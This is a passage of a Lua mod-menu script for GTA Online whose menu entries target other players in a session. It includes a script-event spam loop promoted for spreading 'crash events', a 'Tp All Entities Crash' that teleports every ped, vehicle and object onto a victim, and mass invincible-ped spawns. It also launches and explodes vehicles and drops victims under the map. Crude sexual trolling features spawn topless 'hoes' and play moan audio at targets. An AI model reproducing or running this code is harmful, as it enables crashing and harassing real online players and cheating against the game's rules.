        local vehicle = get_player_vehicle(pid, false)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, -2.0, 0.0, 0.1)
        if vehicle ~= 0 then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_index, coords.x, coords.y, coords.z, 0, 0, 1)
            ENTITY.SET_ENTITY_VELOCITY(vehicle, 0, 0, 0)
            TASK.TASK_ENTER_VEHICLE(player_index, vehicle, 0, -1, 15, 24, true)
            TASK.TASK_ENTER_VEHICLE(player_index, vehicle, -1, -1, 15, 26, true)
            end
        end)
        
        --[[
        menu.toggle_loop(Veh_List, "Kick from Vehicle", {}, "", function()
            local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
            local myveh = PED.GET_VEHICLE_PED_IS_IN(pped, true)
            PED.SET_PED_INTO_VEHICLE(pped, veh, -2)
            util.yield(50)
            ChangeNetObjOwner(veh, pid)
            ChangeNetObjOwner(veh, pped)
            util.yield(50)
            PED.SET_PED_INTO_VEHICLE(pped, myveh, -1)
        end)
        ]]
        
            menu.action(Veh_List, "Launch Vehicle Up", {}, "", function()
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
                if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    util.toast("They aren't in a vehicle. :/")
                    return
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                if veh == 0 then
                    while veh == 0 do
                        util.yield(10)
                        veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                    end
                end
                local ctr = 0
                while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ctr = ctr + 1
                    util.yield(10)
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
                    util.toast("Failed to get control of the vehicle. :/")
                    return
                end
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            end)
            menu.action(Veh_List, "Launch Vehicle Forward", {}, "", function()
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
                if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    util.toast("They aren't in a vehicle. :/")
                    return
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                if veh == 0 then
                    while veh == 0 do
                        util.yield(10)
                        veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                    end
                end
                local ctr = 0
                while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ctr = ctr + 1
                    util.yield(10)
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
                    util.toast("Failed to get control of the vehicle. :/")
                    return
                end
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            end)
        
            menu.action(Veh_List, "Slingshot Vehicle", {}, "", function()
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
                if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    util.toast("They aren't in a vehicle. :/")
                    return
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                if veh == 0 then
                    while veh == 0 do
                        util.yield(10)
                        veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                    end
                end
                local ctr = 0
                while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ctr = ctr + 1
                    util.yield(10)
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
                    util.toast("Failed to get control of the vehicle. :/")
                    return
                end
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            end)
        
            menu.action(Veh_List, "Spawn Ramp In Front Of Player", {}, "", function() 
                local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
                local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
                STREAMING.REQUEST_MODEL(ramp_hash)
                while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
                    util.yield()
                end
        
                local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
        
                ENTITY.SET_ENTITY_VISIBLE(ramp, false)
                ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
                util.yield(1000)
                entities.delete_by_handle(ramp)
            end)
        
            menu.toggle(Plyrveh_list, "Attach to player", {"attachto"}, "Useful, because if you\'re near the player your trolling works better", function(on)
                if on then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                else
                    ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
                end
            end, false)

    Teleport_Options = menu.list(Plyrveh_list, "Entity Options", {}, "")

    
 Teleport_Entities = menu.list(Teleport_Options, "Teleport Entities to Player", {}, "")


menu.action(Teleport_Entities, "Tp Spread Your Shit", {"tpspread"}, "Note: Great for spreading any kinda mods like gifting vehicles or crash events.", function(on_toggle)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    for i=1,1  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1329.5868, -3041.565, 65.06483)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 12.201786, -2608.5598, 27.00581)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 529.52344, -3159.0903, 46.26378)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 797.6639, -2314.7708, 66.75716)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -904.7783, -1799.8903, 60.525257)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -902.62103, -1797.8055, 68.71026)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -811.026, -1052.471, 84.877464)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -74.7535, -820.54895, 331.0572)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 693.5279, -1200.2932, 45.110516)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1944.0536, -911.7328, 177.15826)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 955.1047, 11.822339, 129.3541)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1329.5868, -3041.565, 65.06483)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -604.4595, 53.186974, 124.79825)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -84.817345, 882.59576, 287.78268)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1755.0154, -75.41939, 137.54353)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2568.129, 760.6324, 160.43828)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 807.4092, 2714.9368, 103.85771)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2252.8367, 3330.679, 138.64398)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1970.4495, 2864.2395, 34.49541)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1840.9294, 3868.8608, 54.188793)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 490.04102, 5584.988, 802.92584)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2313.2842, 5981.442, 136.00969)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -272.11963, 6188.8105, 82.51767)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1329.5868, -3041.565, 65.06483)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
    util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
end)

menu.toggle_loop(Teleport_Entities, "Teleport ALL Entities to Player", {"tpallentities"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
    notification("Tp All Entities Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    if on_toggle then
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    else
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    end
end)

menu.action(Teleport_Entities, "TP Peds on Player", {"tppeds"}, "", function ()
    TpAllPeds(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(Teleport_Entities, "TP Peds on Player", {"toggletppeds"}, "", function (on_toggle)
        if on_toggle then
            TpAllPeds(pid)
        else
            TpAllPeds(pid)
        end
end)

menu.action(Teleport_Entities, "TP All Vehicles on Player", {"tpvehs"}, "", function ()
    TpAllVehs(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(Teleport_Entities, "TP All Vehicles on Player", {"toggletppedstpvehs"}, "", function (on_toggle)
        if on_toggle then
            TpAllVehs(pid)
        else
            TpAllVehs(pid)
        end
end)

menu.action(Teleport_Entities, "TP All Objects on Player", {"tpobjs"}, "", function ()
    TpAllObjects(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(Teleport_Entities, "TP All Objects on Player", {"tpobjs"}, "", function (on_toggle)
        if on_toggle then
            TpAllObjects(pid)
        else
            TpAllObjects(pid)
        end
end)

menu.action(Teleport_Entities, "TP All Pickups on Player", {"tppickups"}, "", function ()
    TpAllPickups(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(Teleport_Entities, "TP All Pickups on Player", {"tppickups"}, "", function (on_toggle)
        if on_toggle then
            TpAllPickups(pid)
        else
            TpAllPickups(pid)
        end
end)


local ToplessArmy = menu.list(Teleport_Options, "Topless Army", {}, "")

menu.divider(ToplessArmy, "__________________bruh__________________")

menu.toggle(ToplessArmy, "Topless Fuck Player", {"toplessfucks"}, "May cause crash event (A0:335) if spammed.", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("toplessarmys" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        util.toast("Wait 5 Seconds to turn off please.")
    else
        menu.trigger_commands("cleartoplesshoe" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("superc")
        end        
    end)

menu.action(ToplessArmy, "Topless Dancing Army", {"dancingtopless"}, "Spawns 4 of them around the target then dances like a prostitute.", function(on)
local hooker
local c
-- Infront
c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 1, 0.0)
request_model_load(util.joaat('a_f_y_topless_01'))
hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 1, 0.0)
ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
-- Left
c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -1, 0, 0.0)
request_model_load(util.joaat('a_f_y_topless_01'))
hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -1, 0, 0.0)
ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
-- Right
c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 1, 0, 0.0)
request_model_load(util.joaat('a_f_y_topless_01'))
hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 1, 0, 0.0)
ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
-- Behind
c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, -1, 0.0)
request_model_load(util.joaat('a_f_y_topless_01'))
hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, -1, 0.0)
ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
end, nil, nil, COMMANDPERM_AGGRESSIVE)


menu.click_slider(ToplessArmy, "Spawn Topless Army", {"toplessarmys"}, "", 1, 50, 49, 1, function(val)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local fathoes = util.joaat("a_f_y_topless_01")
    request_model(fathoes)
    for i = 1, val do
        player_fathoes_army[i] = entities.create_ped(28, fathoes, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_fathoes_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_fathoes_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_fathoes_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_fathoes_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
    end 
end)

menu.action(ToplessArmy, "Clear Topless Hoes", {"cleartoplesshoe"}, "", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
        if PED.IS_PED_MODEL(ped, util.joaat("a_f_y_topless_01")) then
            entities.delete_by_handle(ped)
        end
    end
end)


    menu.toggle_loop(Teleport_Options, "TP On Ped Loop", {"tploopon"}, "", function(on_toggle)
        if on_toggle then
        menu.trigger_commands("tp" .. players.get_name(pid))
        else
        menu.trigger_commands("tp" .. players.get_name(pid))
        end
        end)

        
    menu.toggle_loop(Teleport_Options, "Attach All Nearby Entities", {"attachallnearby"}, "", function(on_toggle)
        local tar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        objects = entities.get_all_objects_as_handles()
        vehicles = entities.get_all_vehicles_as_handles()
        peds = entities.get_all_peds_as_handles()
        for i, ent in pairs(peds) do
            if not is_ped_player(ped) then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
            end
        end
        for i, ent in pairs(vehicles) do
            if not is_ped_player(VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)) then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
            end
        end
        for i, ent in pairs(objects) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        end
    end)

    function get_control_request(ent) -- #testing -- new get control request, yield first then request, then return. previously requested then yielded then returned and didnt work?
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("No Control of "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end

local crash_ents = {}
local crash_toggle = false
menu.toggle(Teleport_Options, "Constructipede", {"constructipede"}, "", function(val)
    crash_toggle = val
        if val then
            local ped_mdl = util.joaat("s_m_y_construct_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, 49 do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)

                local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                all_peds = entities.get_all_peds_as_handles()
                local last_ped = 0
                local last_ped_ht = 0
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                        get_control_request(ped)
                        if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                            TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                            TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                        end
            
                        ENTITY.DETACH_ENTITY(ped, false, false)
                        if last_ped ~= 0 then
                            ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0, 0, last_ped_ht, 1, 05, 0, 0, false, false, false, false, 0, false)
                        else
                            ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                        end
                        last_ped = ped
                    end
                end
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_jackham") then
                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

menu.toggle_loop(Teleport_Options, "Jack Hammmer Noise Boost", {"jacknoiseboost"}, "", function()
    menu.trigger_commands("jacknoise" .. PLAYER.GET_PLAYER_NAME(pid)) 
    util.yield(1000)     
end)

        local dont_stop = false
        menu.toggle_loop(Teleport_Options,"Blackhole", {"blackhole"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
            notification("Vehicle Chaos sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
                local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
                local locspeed2 = speed
                        local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                if not PED.IS_PED_A_PLAYER(PedInSeat) then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
              ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                            vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                            speed = 100
                            local x_vec = (holecoords['x']-vcoords['x'])*speed
                            local y_vec = (holecoords['y']-vcoords['y'])*speed
                            local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                            ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                            VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
                            FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
                            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
                            VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
                    if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
                    end
                end
            end
        end)

        
        hole_zoff = 50
            menu.slider(Teleport_Options, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
            hole_zoff = s
        end)

        menu.action(Teleport_Options, "Teleport under the map", {}, "Teleport them in the void", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_ENTITY_COORDS(p)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
            c.z = c.z - 100
            if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
                local success, floorcoords
                repeat
                    success, floorcoords = util.get_ground_z(c.x, c.y)
                    util.yield()
                until success
                RequestControl(veh)
                floorcoords = floorcoords - 50
                ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false) --tp undermap
            else
                util.toast(players.get_name(pid).. " is not in a vehicle")
            end
        end)

        
    menu.action(Teleport_Options, "Teleport to prison", {}, "Teleport them to Prison [The player must be in a vehicle].", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            RequestControl(veh)
            ENTITY.SET_ENTITY_COORDS(veh, 1652.5746, 2569.7756, 45.564854, false, false, false, false) --tp in prison
        else
            util.toast(players.get_name(pid).. " is not in a vehicle")
        end
    end)
        

local crash_ents = {}
local crash_toggle = false
menu.action(Teleport_Options, "Jack Hammmer Noise", {"jacknoise"}, "Sends Jack Hammmers to cause noise.", function(val)
    crash_toggle = val
        if val then
            local ped_mdl = util.joaat("s_m_y_construct_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, 48 do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, false)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_CONST_DRILL", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_jackham") then
                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end


all_female_sex_voicenames = {
    "S_F_Y_HOOKER_01_WHITE_FULL_01",
    "S_F_Y_HOOKER_01_WHITE_FULL_02",
    "S_F_Y_HOOKER_01_WHITE_FULL_03",
    "S_F_Y_HOOKER_02_WHITE_FULL_01",
    "S_F_Y_HOOKER_02_WHITE_FULL_02",
    "S_F_Y_HOOKER_02_WHITE_FULL_03",
    "S_F_Y_HOOKER_03_BLACK_FULL_01",
    "S_F_Y_HOOKER_03_BLACK_FULL_03",
}

local female_speeches = {
    "SEX_GENERIC_FEM",
    "SEX_HJ",
    "SEX_ORAL_FEM",
    "SEX_CLIMAX",
    "SEX_GENERIC"
}



function moan(pos, gender)
    util.create_thread(function()
        local hash = util.joaat('s_f_y_hooker_01')
        request_model(hash)
        local new_ped = entities.create_ped(28, hash, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(new_ped, false, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(new_ped, true)
        local voice_name
        local speech_nam
        if gender == 'f' then
            voice_name = all_female_sex_voicenames[math.random(#all_female_sex_voicenames)]
            speech_name = female_speeches[math.random(#female_speeches)]
        else
            voice_name = "MICHAEL_NORMAL"
            speech_name = "SEX_GENERIC"
        end
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(new_ped, speech_name, voice_name, "SPEECH_PARAMS_FORCE", 0)
        local st_time = os.time()
        while true do 
            if os.time() - st_time >= 5 then 
                entities.delete(new_ped)
                util.stop_thread()
            end
            local c = players.get_position(players.user())
            ENTITY.SET_ENTITY_COORDS(new_ped, c.x, c.y, c.z+3, false, false, false, false)
            util.yield()
        end
    end)
end
    
escort_root = menu.list(Plyrveh_list, "Escort services", {"sexluaescorts"}, "")

menu.toggle_loop(escort_root, "Female Moan", {"fsexmoan"}, "", function(on_click)
    moan(players.get_position(players.user()), 'f')
    util.yield(1500)
end)

menu.toggle_loop(escort_root, "Male Moan", {"msexmoan"}, "", function(on_click)
    moan(players.get_position(players.user()), 'm')
    util.yield(1500)
end)


